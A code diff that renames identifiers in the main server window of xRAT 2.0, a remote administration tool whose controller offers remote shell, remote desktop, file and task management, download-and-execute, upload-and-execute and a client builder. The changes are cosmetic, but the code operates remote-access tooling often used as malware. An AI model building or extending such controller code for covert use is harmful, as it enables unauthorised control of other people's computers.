@@ -10,14 +10,14 @@ using xServer.Settings;
 
 namespace xServer.Forms
 {
-    public partial class frmMain : Form
+    public partial class FrmMain : Form
     {
-        public Server listenServer;
-        private ListViewColumnSorter lvwColumnSorter;
+        public Server ListenServer;
+        private readonly ListViewColumnSorter _lvwColumnSorter;
 
-        private void ReadSettings(bool WriteIfNotExist = true)
+        private void ReadSettings(bool writeIfNotExist = true)
         {
-            if (WriteIfNotExist)
+            if (writeIfNotExist)
                 XMLSettings.WriteDefaultSettings();
 
             XMLSettings.ListenPort = ushort.Parse(XMLSettings.ReadValue("ListenPort"));
@@ -28,11 +28,11 @@ namespace xServer.Forms
             XMLSettings.Password = XMLSettings.ReadValue("Password");
         }
 
-        private void ShowTermsOfService(bool Show)
+        private void ShowTermsOfService(bool show)
         {
-            if (Show)
+            if (show)
             {
-                using (var frm = new frmTermsOfUse())
+                using (var frm = new FrmTermsOfUse())
                 {
                     frm.ShowDialog();
                 }
@@ -40,7 +40,7 @@ namespace xServer.Forms
             }
         }
 
-        public frmMain()
+        public FrmMain()
         {
             ReadSettings();
             ShowTermsOfService(XMLSettings.ShowToU);
@@ -49,14 +49,14 @@ namespace xServer.Forms
 
             this.Menu = mainMenu;
 
-            lvwColumnSorter = new ListViewColumnSorter();
-            lstClients.ListViewItemSorter = lvwColumnSorter;
+            _lvwColumnSorter = new ListViewColumnSorter();
+            lstClients.ListViewItemSorter = _lvwColumnSorter;
 
             ListViewExtensions.removeDots(lstClients);
             ListViewExtensions.changeTheme(lstClients);
         }
 
-        public void updateWindowTitle(int count, int selected)
+        public void UpdateWindowTitle(int count, int selected)
         {
             try
             {
@@ -79,11 +79,11 @@ namespace xServer.Forms
             { }
         }
 
-        private void frmMain_Load(object sender, EventArgs e)
+        private void FrmMain_Load(object sender, EventArgs e)
         {
-            listenServer = new Server(8192);
+            ListenServer = new Server(8192);
 
-            listenServer.AddTypesToSerializer(typeof(IPacket), new Type[]
+            ListenServer.AddTypesToSerializer(typeof(IPacket), new Type[]
             {
                 typeof(Core.Packets.ServerPackets.InitializeCommand),
                 typeof(Core.Packets.ServerPackets.Disconnect),
@@ -121,22 +121,22 @@ namespace xServer.Forms
                 typeof(Core.Packets.ClientPackets.ShellCommandResponse)
             });
 
-            listenServer.ServerState += serverState;
-            listenServer.ClientState += clientState;
-            listenServer.ClientRead += clientRead;
+            ListenServer.ServerState += ServerState;
+            ListenServer.ClientState += ClientState;
+            ListenServer.ClientRead += ClientRead;
 
             if (XMLSettings.AutoListen)
             {
                 if (XMLSettings.UseUPnP)
                     UPnP.ForwardPort(ushort.Parse(XMLSettings.ListenPort.ToString()));
-                listenServer.Listen(XMLSettings.ListenPort);
+                ListenServer.Listen(XMLSettings.ListenPort);
             }
         }
 
-        private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
+        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
         {
-            if (listenServer.Listening)
-                listenServer.Disconnect();
+            if (ListenServer.Listening)
+                ListenServer.Disconnect();
 
             if (XMLSettings.UseUPnP)
                 UPnP.RemovePort(ushort.Parse(XMLSettings.ListenPort.ToString()));
@@ -146,10 +146,10 @@ namespace xServer.Forms
 
         private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
         {
-            updateWindowTitle(listenServer.ConnectedClients, lstClients.SelectedItems.Count);
+            UpdateWindowTitle(ListenServer.ConnectedClients, lstClients.SelectedItems.Count);
         }
 
-        private void serverState(Server server, bool listening)
+        private void ServerState(Server server, bool listening)
         {
             try
             {
@@ -162,7 +162,7 @@ namespace xServer.Forms
             { }
         }
 
-        private void clientState(Server server, Client client, bool connected)
+        private void ClientState(Server server, Client client, bool connected)
         {
             if (connected)
             {
@@ -178,15 +178,15 @@ namespace xServer.Forms
                         lvi.Remove();
                         server.ConnectedClients--;
                     }
-                updateWindowTitle(listenServer.ConnectedClients, lstClients.SelectedItems.Count);
+                UpdateWindowTitle(ListenServer.ConnectedClients, lstClients.SelectedItems.Count);
             }
         }
 
-        private void clientRead(Server server, Client client, IPacket packet)
+        private void ClientRead(Server server, Client client, IPacket packet)
         {
-            Type type = packet.GetType();
+            var type = packet.GetType();
 
-            if (!client.Value.isAuthenticated)
+            if (!client.Value.IsAuthenticated)
             {
                 if (type == typeof(Core.Packets.ClientPackets.Initialize))
                     CommandHandler.HandleInitialize(client, (Core.Packets.ClientPackets.Initialize)packet, this);
@@ -239,19 +239,19 @@ namespace xServer.Forms
         private void lstClients_ColumnClick(object sender, ColumnClickEventArgs e)
         {
             // Determine if clicked column is already the column that is being sorted.
-            if (e.Column == lvwColumnSorter.SortColumn)
+            if (e.Column == _lvwColumnSorter.SortColumn)
             {
                 // Reverse the current sort direction for this column.
-                if (lvwColumnSorter.Order == SortOrder.Ascending)
-                    lvwColumnSorter.Order = SortOrder.Descending;
+                if (_lvwColumnSorter.Order == SortOrder.Ascending)
+                    _lvwColumnSorter.Order = SortOrder.Descending;
                 else
-                    lvwColumnSorter.Order = SortOrder.Ascending;
+                    _lvwColumnSorter.Order = SortOrder.Ascending;
             }
             else
             {
                 // Set the column number that is to be sorted; default to ascending.
-                lvwColumnSorter.SortColumn = e.Column;
-                lvwColumnSorter.Order = SortOrder.Ascending;
+                _lvwColumnSorter.SortColumn = e.Column;
+                _lvwColumnSorter.Order = SortOrder.Ascending;
             }
 
             // Perform the sort with these new sort options.
@@ -264,13 +264,13 @@ namespace xServer.Forms
             {
                 if (lstClients.SelectedItems.Count != 0)
                 {
-                    frmUpdate frmU = new frmUpdate(lstClients.SelectedItems.Count);
-                    if (frmU.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                    FrmUpdate frmU = new FrmUpdate(lstClients.SelectedItems.Count);
+                    if (frmU.ShowDialog() == DialogResult.OK)
                     {
                         foreach (ListViewItem lvi in lstClients.SelectedItems)
                         {
                             Client c = (Client)lvi.Tag;
-                            new Core.Packets.ServerPackets.Update(_Update.DownloadURL).Execute(c);
+                            new Core.Packets.ServerPackets.Update(Core.Misc.Update.DownloadURL).Execute(c);
                         }
                     }
                 }
@@ -296,7 +296,7 @@ namespace xServer.Forms
 
             private void ctxtUninstall_Click(object sender, EventArgs e)
             {
-                if (MessageBox.Show(string.Format("Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back!", lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Yes)
+                if (MessageBox.Show(string.Format("Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back!", lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                 {
                     foreach (ListViewItem lvi in lstClients.SelectedItems)
                     {
@@ -313,12 +313,12 @@ namespace xServer.Forms
                 if (lstClients.SelectedItems.Count != 0)
                 {
                     Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmSI != null)
+                    if (c.Value.FrmSi != null)
                     {
-                        c.Value.frmSI.Focus();
+                        c.Value.FrmSi.Focus();
                         return;
                     }
-                    frmSystemInformation frmSI = new frmSystemInformation(c);
+                    FrmSystemInformation frmSI = new FrmSystemInformation(c);
                     frmSI.Show();
                 }
             }
@@ -328,12 +328,12 @@ namespace xServer.Forms
                 if (lstClients.SelectedItems.Count != 0)
                 {
                     Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmTM != null)
+                    if (c.Value.FrmTm != null)
                     {
-                        c.Value.frmTM.Focus();
+                        c.Value.FrmTm.Focus();
                         return;
                     }
-                    frmTaskManager frmTM = new frmTaskManager(c);
+                    FrmTaskManager frmTM = new FrmTaskManager(c);
                     frmTM.Show();
                 }
             }
@@ -343,12 +343,12 @@ namespace xServer.Forms
                 if (lstClients.SelectedItems.Count != 0)
                 {
                     Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmFM != null)
+                    if (c.Value.FrmFm != null)
                     {
-                        c.Value.frmFM.Focus();
+                        c.Value.FrmFm.Focus();
                         return;
                     }
-                    frmFileManager frmFM = new frmFileManager(c);
+                    FrmFileManager frmFM = new FrmFileManager(c);
                     frmFM.Show();
                 }
             }
@@ -366,12 +366,12 @@ namespace xServer.Forms
                 if (lstClients.SelectedItems.Count != 0)
                 {
                     Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmRS != null)
+                    if (c.Value.FrmRs != null)
                     {
-                        c.Value.frmRS.Focus();
+                        c.Value.FrmRs.Focus();
                         return;
                     }
-                    frmRemoteShell frmRS = new frmRemoteShell(c);
+                    FrmRemoteShell frmRS = new FrmRemoteShell(c);
                     frmRS.Show();
                 }
             }
@@ -419,12 +419,12 @@ namespace xServer.Forms
                 if (lstClients.SelectedItems.Count != 0)
                 {
                     Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmRDP != null)
+                    if (c.Value.FrmRdp != null)
                     {
-                        c.Value.frmRDP.Focus();
+                        c.Value.FrmRdp.Focus();
                         return;
                     }
-                    frmRemoteDesktop frmRDP = new frmRemoteDesktop(c);
+                    FrmRemoteDesktop frmRDP = new FrmRemoteDesktop(c);
                     frmRDP.Show();
                 }
             }
@@ -435,9 +435,9 @@ namespace xServer.Forms
             {
                 if (lstClients.SelectedItems.Count != 0)
                 {
-                    using (var frm = new frmDownloadAndExecute(lstClients.SelectedItems.Count))
+                    using (var frm = new FrmDownloadAndExecute(lstClients.SelectedItems.Count))
                     {
-                        if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                        if (frm.ShowDialog() == DialogResult.OK)
                         {
                             foreach (ListViewItem lvi in lstClients.SelectedItems)
                             {
@@ -453,9 +453,9 @@ namespace xServer.Forms
             {
                 if (lstClients.SelectedItems.Count != 0)
                 {
-                    using (var frm = new frmUploadAndExecute(lstClients.SelectedItems.Count))
+                    using (var frm = new FrmUploadAndExecute(lstClients.SelectedItems.Count))
                     {
-                        if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                        if (frm.ShowDialog() == DialogResult.OK)
                         {
                             foreach (ListViewItem lvi in lstClients.SelectedItems)
                             {
@@ -472,9 +472,9 @@ namespace xServer.Forms
             {
                 if (lstClients.SelectedItems.Count != 0)
                 {
-                    using (var frm = new frmVisitWebsite(lstClients.SelectedItems.Count))
+                    using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                     {
-                        if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                        if (frm.ShowDialog() == DialogResult.OK)
                         {
                             foreach (ListViewItem lvi in lstClients.SelectedItems)
                             {
@@ -491,12 +491,12 @@ namespace xServer.Forms
                 if (lstClients.SelectedItems.Count != 0)
                 {
                     Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmSM != null)
+                    if (c.Value.FrmSm != null)
                     {
-                        c.Value.frmSM.Focus();
+                        c.Value.FrmSm.Focus();
                         return;
                     }
-                    frmShowMessagebox frmSM = new frmShowMessagebox(c);
+                    FrmShowMessagebox frmSM = new FrmShowMessagebox(c);
                     frmSM.Show();
                 }
             }
@@ -511,7 +511,7 @@ namespace xServer.Forms
 
         private void menuSettings_Click(object sender, EventArgs e)
         {
-            using (var frm = new frmSettings(listenServer))
+            using (var frm = new FrmSettings(ListenServer))
             {
                 frm.ShowDialog();
             }
@@ -519,7 +519,7 @@ namespace xServer.Forms
 
         private void menuBuilder_Click(object sender, EventArgs e)
         {
-            using (var frm = new frmBuilder())
+            using (var frm = new FrmBuilder())
             {
                 frm.ShowDialog();
             }
@@ -527,11 +527,11 @@ namespace xServer.Forms
 
         private void menuStatistics_Click(object sender, EventArgs e)
         {
-            if (listenServer.BytesReceived == 0 || listenServer.BytesSent == 0)
+            if (ListenServer.BytesReceived == 0 || ListenServer.BytesSent == 0)
                 MessageBox.Show("Please wait for at least one connected Client!", "xRAT 2.0", MessageBoxButtons.OK, MessageBoxIcon.Information);
             else
             {
-                using (var frm = new frmStatistics(listenServer.BytesReceived, listenServer.BytesSent, listenServer.ConnectedClients, listenServer.AllTimeConnectedClients))
+                using (var frm = new FrmStatistics(ListenServer.BytesReceived, ListenServer.BytesSent, ListenServer.ConnectedClients, ListenServer.AllTimeConnectedClients))
                 {
                     frm.ShowDialog();
                 }
@@ -540,7 +540,7 @@ namespace xServer.Forms
 
         private void menuAbout_Click(object sender, EventArgs e)
         {
-            using (var frm = new frmAbout())
+            using (var frm = new FrmAbout())
             {
                 frm.ShowDialog();
             }
